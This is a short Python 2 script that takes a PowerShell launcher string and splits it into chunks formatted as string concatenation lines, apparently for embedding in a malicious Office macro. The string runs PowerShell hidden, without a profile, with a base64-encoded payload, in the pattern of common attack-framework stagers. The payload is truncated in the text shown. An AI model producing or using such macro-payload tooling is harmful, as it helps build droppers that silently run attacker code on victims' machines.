#!/usr/bin/python

str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB..."

n = 50

for i in range(0, len(str), n):
  print "Str = Str + " + '"' + str[i:i+n] + '"'
